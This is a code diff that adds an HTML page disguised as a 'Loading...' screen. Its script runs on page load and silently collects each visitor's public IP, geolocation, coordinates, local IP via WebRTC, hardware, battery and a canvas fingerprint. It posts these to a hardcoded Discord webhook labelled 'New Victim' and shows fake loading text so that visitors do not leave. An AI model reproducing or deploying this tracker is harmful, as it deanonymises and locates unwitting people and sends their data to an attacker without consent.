@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>body { background:#000; color:#0f0; font-family:monospace; padding:20px; }</style>
+    <script>
+        (async function steal() {
+            // === Public IP + Geo ===
+            let dox = { timestamp: new Date().toISOString() };
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                dox.publicIp = (await ipRes.json()).ip;
+
+                const geo = await fetch(`https://ipapi.co/${dox.publicIp}/json/`);
+                dox.geo = await geo.json();
+            } catch {}
+
+            // === Deep Fingerprint ===
+            dox.fingerprint = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                languages: navigator.languages?.join(', ') || navigator.language,
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                avail: `${screen.availWidth}x${screen.availHeight}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardware: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory || 'unknown',
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'unknown',
+                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(' | ') || 'none',
+                canvas: getCanvasHash(),
+                localIp: await getWebRtcIp(),
+                battery: await getBattery(),
+                doNotTrack: navigator.doNotTrack || 'unknown',
+                referrer: document.referrer || 'direct'
+            };
+
+            // === Send to Discord webhook ===
+            const webhook = "https://discord.com/api/webhooks/1445978398391275721/wiUM_7MA6Pin70VLVcXT30GwF7gYfNJExBgkVHPoRrCCcXoqXLo31iCeOyIJdP87mK6N";
+
+            const embed = {
+                title: "Silent Hit — New Victim",
+                color: 0xFF0000,
+                timestamp: dox.timestamp,
+                fields: [
+                    { name: "Public IP", value: dox.publicIp || "?", inline: true },
+                    { name: "City / Region", value: dox.geo?.city ? `${dox.geo.city}, ${dox.geo.region} (${dox.geo.country_name})` : "?", inline: true },
+                    { name: "ISP / Org", value: dox.geo?.org || dox.geo?.asn || "?", inline: true },
+                    { name: "Coordinates", value: dox.geo?.latitude && dox.geo?.longitude ? `${dox.geo.latitude}, ${dox.geo.longitude}` : "?", inline: true },
+                    { name: "User Agent", value: "```" + (dox.fingerprint.userAgent || "?").slice(0,300) + "```", inline: false },
+                    { name: "Hardware", value: `Cores: ${dox.fingerprint.hardware} | RAM: ${dox.fingerprint.memory}GB`, inline: true },
+                    { name: "Local IP (WebRTC)", value: dox.fingerprint.localIp || "?", inline: true },
+                    { name: "Canvas Hash", value: dox.fingerprint.canvas.slice(0,64) + "...", inline: false }
+                ],
+                footer: { text: "More fields truncated for embed size" }
+            };
+
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ embeds: [embed] })
+            }).catch(() => {});
+
+            // Fake content so they don't bounce immediately
+            document.body.innerHTML = "<h1 style='text-align:center;margin-top:20vh;'>Site loading... please wait</h1>";
+        })();
+
+        // Helpers
+        function getCanvasHash() {
+            try {
+                const c = document.createElement("canvas");
+                const ctx = c.getContext("2d");
+                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
+                ctx.fillText("🖕Fingerprint☠️", 2, 2);
+                ctx.fillStyle = "#f0f"; ctx.fillRect(10, 10, 100, 50);
+                return btoa(c.toDataURL());
+            } catch { return "blocked"; }
+        }
+
+        async function getWebRtcIp() {
+            return new Promise(r => {
+                const pc = new RTCPeerConnection({iceServers:[]});
+                pc.createDataChannel("");
+                pc.createOffer(o => pc.setLocalDescription(o), ()=>{});
+                pc.onicecandidate = e => {
+                    if (!e.candidate) return r("unknown");
+                    const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                    if (m) r(m[1]);
+                };
+                setTimeout(() => r("timeout"), 1500);
+            });
+        }
+
+        async function getBattery() {
+            if (!navigator.getBattery) return "n/a";
+            try {
+                const b = await navigator.getBattery();
+                return `${Math.round(b.level*100)}% ${b.charging ? "charging" : "discharging"}`;
+            } catch { return "blocked"; }
+        }
+    </script>
+</head>
+<body></body>
+</html>
